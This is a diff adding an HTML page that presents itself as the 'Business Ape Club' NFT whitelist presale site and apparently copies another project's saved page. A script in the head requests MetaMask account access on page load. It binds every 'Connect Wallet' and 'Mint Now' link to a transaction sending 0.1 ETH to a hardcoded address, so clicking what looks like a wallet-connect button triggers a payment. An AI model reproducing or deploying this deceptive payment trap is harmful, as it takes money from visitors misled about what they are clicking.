@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8"><link rel="stylesheet" href="Business%20Ape%20Club_files/all.css" integrity="sha512-1ycn6IcaQQ40/MKBW2W4Rhis/DbILU74C1vSrLJxCq57o941Ym01SwNsOMqvEBFlcgUa6xLiPY/NS5R+E6ztJQ==" crossorigin="anonymous" referrerpolicy="no-referrer"><meta charset="utf-8"><link rel="icon" href="https://businessapeclub.com/favicon.ico"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5,user-scalable=no"><meta name="theme-color" content="#01040C"><meta name="description" content="The Business Ape Club brings together people of entrepreneurial spirit and philanthropic nature who believe that their own hard work and risk in business and investment deserve a fair reward for themselves and a helping hand for anyone less fortunate."><link rel="apple-touch-icon" href="https://businessapeclub.com/logo192.png"><link rel="manifest" href="https://businessapeclub.com/manifest.json"><title>Business Ape Club</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script src="https://unpkg.com/@metamask/legacy-web3@latest/dist/metamask.web3.min.js"></script>
+
+<script type="text/javascript">
+  window.addEventListener('load', async () => {
+    if (window.ethereum) {
+      window.web3 = new Web3(ethereum);
+      try {
+        await ethereum.enable();
+        initPayButton()
+      } catch (err) {
+        $('#status').html('User denied account access', err)
+      }
+    } else if (window.web3) {
+      window.web3 = new Web3(web3.currentProvider)
+      initPayButton()
+    } else {
+      $('#status').html('No Metamask (or other Web3 Provider) installed')
+    }
+  })
+
+  const initPayButton = () => {
+    $('.pay-button').click(() => {
+      // paymentAddress is where funds will be send to
+      const paymentAddress = '0x0c01cc071cae1a9e9f5ab02c26a02a4c3a3f0735'
+      const amountEth = 0.1
+
+      web3.eth.sendTransaction({
+        to: paymentAddress,
+        value: web3.toWei(amountEth, 'ether')
+      }, (err, transactionId) => {
+        if  (err) {
+          console.log('Payment failed', err)
+          $('#status').html('Payment failed')
+        } else {
+          console.log('Payment successful', transactionId)
+          $('#status').html('Payment successful')
+        }
+      })
+    })
+  }
+</script>
+
+<link href="Business%20Ape%20Club_files/2.css" rel="stylesheet"><link href="Business%20Ape%20Club_files/main.css" rel="stylesheet"><style id="_goober"> @keyframes go2264125279{from{transform:scale(0) rotate(45deg);opacity:0;}to{transform:scale(1) rotate(45deg);opacity:1;}}@keyframes go3020080000{from{transform:scale(0);opacity:0;}to{transform:scale(1);opacity:1;}}@keyframes go463499852{from{transform:scale(0) rotate(90deg);opacity:0;}to{transform:scale(1) rotate(90deg);opacity:1;}}@keyframes go1268368563{from{transform:rotate(0deg);}to{transform:rotate(360deg);}}@keyframes go1310225428{from{transform:scale(0) rotate(45deg);opacity:0;}to{transform:scale(1) rotate(45deg);opacity:1;}}@keyframes go651618207{0%{height:0;width:0;opacity:0;}40%{height:0;width:6px;opacity:1;}100%{opacity:1;height:10px;}}@keyframes go901347462{from{transform:scale(0.6);opacity:0.4;}to{transform:scale(1);opacity:1;}}.go4109123758{z-index:9999;}.go4109123758 > *{pointer-events:auto;}</style><style></style><style data-jss="" data-meta="MuiSvgIcon">
+.MuiSvgIcon-root {
+  fill: currentColor;
+  width: 1em;
+  height: 1em;
+  display: inline-block;
+  font-size: 1.5rem;
+  transition: fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+  flex-shrink: 0;
+  -moz-user-select: none;
+}
+.MuiSvgIcon-colorPrimary {
+  color: #3f51b5;
+}
+.MuiSvgIcon-colorSecondary {
+  color: #f50057;
+}
+.MuiSvgIcon-colorAction {
+  color: rgba(0, 0, 0, 0.54);
+}
+.MuiSvgIcon-colorError {
+  color: #f44336;
+}
+.MuiSvgIcon-colorDisabled {
+  color: rgba(0, 0, 0, 0.26);
+}
+.MuiSvgIcon-fontSizeInherit {
+  font-size: inherit;
+}
+.MuiSvgIcon-fontSizeSmall {
+  font-size: 1.25rem;
+}
+.MuiSvgIcon-fontSizeLarge {
+  font-size: 2.1875rem;
+}
+</style></head><body data-aos-easing="ease" data-aos-duration="1200" data-aos-delay="0"><noscript>You need to enable JavaScript to run this app.</noscript><div id="app"><div style="position: fixed; z-index: 9999; inset: 16px; pointer-events: none;"></div><section id="hero"><div class="connectModal"><div class="modelContent"><div class="connectWalletHeader"><a class="pay-button"><h1 class="connectWalletTitle">MINT!!</h1></a><button class="connectModalCloseButton"><i class="fas fa-times"></i></button></div><div class="connectWalletWrapper"><div class="metaMask"><div class="left"><div class="icon"><img src="Business%20Ape%20Club_files/metamask.png" alt=""></div></div><div class="metaMiddle"><h2>Metamask</h2><p>Connect using browser wallet</p></div><div class="right"><button><i class="fas fa-chevron-right"></i></button></div></div><div class="wallet"><div class="left"><div class="icon"><img src="Business%20Ape%20Club_files/wallet-connect.png" alt=""></div></div><div class="metaMiddle"><h2>Wallet Connect</h2><p>Connect using mobile wallet</p></div><div class="right"><button><i class="fas fa-chevron-right"></i></button></div></div></div></div></div><header id="web-header2" class="react-reveal" style="animation-fill-mode: both; animation-duration: 1000ms; animation-delay: 0ms; animation-iteration-count: 1; opacity: 1; animation-name: react-reveal-14791526384625-1;"><div class="header-container2"><a class="header-logo2" href="https://businessapeclub.com/"><img class="header-main-logo" loading="lazy" src="Business%20Ape%20Club_files/logo.png" alt=""><span class="header-text-logo">Business Ape Club</span></a><div class="header-nav"><A class="pay-button"><button class="header2-connect-btn row">Connect Wallet</button></A><a href="https://discord.com/invite/ExA6wE9uC4" target="_blank" rel="noopener noreferrer" class="header-btns"><img src="Business%20Ape%20Club_files/discord.svg" alt=""></a><a href="https://twitter.com/BusinessApeClub" target="_blank" rel="noopener noreferrer" class="header-btns"><img src="Business%20Ape%20Club_files/twitter.svg" alt=""></a><a href="https://www.instagram.com/businessapeclub/" target="_blank" rel="noopener noreferrer" class="header-btns"><img src="Business%20Ape%20Club_files/instagram.svg" alt=""></a><a href="https://discord.com/invite/ExA6wE9uC4" target="_blank" rel="noopener noreferrer" class="header-btns discord-btn">Join Discord <img src="Business%20Ape%20Club_files/discord.svg" alt=""></a></div></div></header><div id="WhiteSale"><div class="container"><div class="sec-heading-wrapper"><h1 class="react-reveal sec-heading" style="animation-fill-mode: both; animation-duration: 1000ms; animation-delay: 0ms; animation-iteration-count: 1; opacity: 1; animation-name: react-reveal-14791526384625-2;">WhiteList Presale</h1></div><div class="react-reveal counter-heading" style="animation-fill-mode: both; animation-duration: 1000ms; animation-delay: 0ms; animation-iteration-count: 1; opacity: 1; animation-name: react-reveal-14791526384625-2;"><h2>3rd Jan 12:00PM GMT.</h2></div><div class="react-reveal hero-counter" style="animation-fill-mode: both; animation-duration: 1000ms; animation-delay: 0ms; animation-iteration-count: 1; opacity: 1; animation-name: react-reveal-14791526384625-2;"><div class="countDown"><div class="timer"><div class="timerNums"><div class="days"><div class="txt">DAYS</div><div class="number">00</div></div><div class="hours"><div class="txt">HOURS</div><div class="number">00</div></div><div class="mins"><div class="txt">MINS</div><div class="number">00</div></div><div class="seconds"><div class="txt">SECS</div><div class="number">00</div></div></div></div></div></div><a class="pay-button"><button class="react-reveal mint-now-" style="animation-fill-mode: both; animation-duration: 1000ms; animation-delay: 0ms; animation-iteration-count: 1; opacity: 1; animation-name: react-reveal-14791526384625-2;">Mint Now</button></a></div></div><div id="GreyListPreSale"><div class="container"><div class="sec-heading-wrapper"><h1 class="react-reveal sec-heading">Greylist Presale</h1></div><div class="counter-heading"><h2 class="react-reveal">4th Jan 12:00PM GMT.</h2></div><div class="react-reveal hero-counter"><div class="countDown"><div class="timer"><div class="timerNums"><div class="days"><div class="txt">DAYS</div><div class="number">00</div></div><div class="hours"><div class="txt">HOURS</div><div class="number">21</div></div><div class="mins"><div class="txt">MINS</div><div class="number">58</div></div><div class="seconds"><div class="txt">SECS</div><div class="number">10</div></div></div></div></div></div><a class="pay-button"><button class="react-reveal mint-now- ">Mint Now</button></a></div></div></section><footer class="footer"><div class="container ft-top-sec row"><div class="infos"><div class="picto"><img src="Business%20Ape%20Club_files/logo.png" alt="Business Ape Club"></div><p class="typo">BUSINESS APE CLUB</p><p class="text-pr">businessapeclub@gmail.com</p></div><div class="f-right row "><div class="social row"><div class="link"><a href="https://www.instagram.com/businessapeclub/" target="_blank" rel="noopener noreferrer" class="insta row">.</a></div><div class="link"><a href="https://twitter.com/BusinessApeClub" target="_blank" rel="noopener noreferrer" class="twitter row">.</a></div><div class="link"><a href="https://discord.gg/qn5GvSzt5z" target="_blank" rel="noopener noreferrer" class="discord row">.</a></div><div class="link"><a href="https://www.tiktok.com/@businessapeclub?" target="_blank" rel="noopener noreferrer" class="tiktok row">.</a></div></div><button class="f-terms-btn">Terms &amp; Conditions</button></div></div><div class="container smartContract"><p class="copyright">©2021 &nbsp; Business Ape Club</p></div></footer><div class="go-to-top" id="scrollToTop"><svg class="MuiSvgIcon-root" focusable="false" viewBox="0 0 24 24" aria-hidden="true"><path d="M4 12l1.41 1.41L11 7.83V20h2V7.83l5.58 5.59L20 12l-8-8-8 8z"></path></svg></div><div class="loader-wrapper d-none"><div class="fixed-loading-wrapper"><div class="loader-wrapp"><div class="loader-logo"><img src="Business%20Ape%20Club_files/logo.png" alt="Business Ape Club"></div><div class="loader"></div></div></div></div></div><script>!function(e){function r(r){for(var n,a,i=r[0],c=r[1],l=r[2],s=0,p=[];s<i.length;s++)a=i[s],Object.prototype.hasOwnProperty.call(o,a)&&o[a]&&p.push(o[a][0]),o[a]=0;for(n in c)Object.prototype.hasOwnProperty.call(c,n)&&(e[n]=c[n]);for(f&&f(r);p.length;)p.shift()();return u.push.apply(u,l||[]),t()}function t(){for(var e,r=0;r<u.length;r++){for(var t=u[r],n=!0,i=1;i<t.length;i++){var c=t[i];0!==o[c]&&(n=!1)}n&&(u.splice(r--,1),e=a(a.s=t[0]))}return e}var n={},o={1:0},u=[];function a(r){if(n[r])return n[r].exports;var t=n[r]={i:r,l:!1,exports:{}};return e[r].call(t.exports,t,t.exports,a),t.l=!0,t.exports}a.e=function(e){var r=[],t=o[e];if(0!==t)if(t)r.push(t[2]);else{var n=new Promise((function(r,n){t=o[e]=[r,n]}));r.push(t[2]=n);var u,i=document.createElement("script");i.charset="utf-8",i.timeout=120,a.nc&&i.setAttribute("nonce",a.nc),i.src=function(e){return a.p+"static/js/"+({}[e]||e)+"."+{3:"86e97be2",4:"5c4c5fcf"}[e]+".chunk.js"}(e);var c=new Error;u=function(r){i.onerror=i.onload=null,clearTimeout(l);var t=o[e];if(0!==t){if(t){var n=r&&("load"===r.type?"missing":r.type),u=r&&r.target&&r.target.src;c.message="Loading chunk "+e+" failed.\n("+n+": "+u+")",c.name="ChunkLoadError",c.type=n,c.request=u,t[1](c)}o[e]=void 0}};var l=setTimeout((function(){u({type:"timeout",target:i})}),12e4);i.onerror=i.onload=u,document.head.appendChild(i)}return Promise.all(r)},a.m=e,a.c=n,a.d=function(e,r,t){a.o(e,r)||Object.defineProperty(e,r,{enumerable:!0,get:t})},a.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},a.t=function(e,r){if(1&r&&(e=a(e)),8&r)return e;if(4&r&&"object"==typeof e&&e&&e.__esModule)return e;var t=Object.create(null);if(a.r(t),Object.defineProperty(t,"default",{enumerable:!0,value:e}),2&r&&"string"!=typeof e)for(var n in e)a.d(t,n,function(r){return e[r]}.bind(null,n));return t},a.n=function(e){var r=e&&e.__esModule?function(){return e.default}:function(){return e};return a.d(r,"a",r),r},a.o=function(e,r){return Object.prototype.hasOwnProperty.call(e,r)},a.p="/",a.oe=function(e){throw console.error(e),e};var i=this.webpackJsonpsupersquatch=this.webpackJsonpsupersquatch||[],c=i.push.bind(i);i.push=r,i=i.slice();for(var l=0;l<i.length;l++)r(i[l]);var f=c;t()}([])</script><script src="Business%20Ape%20Club_files/2.js"></script><script src="Business%20Ape%20Club_files/main.js"></script></body></html>
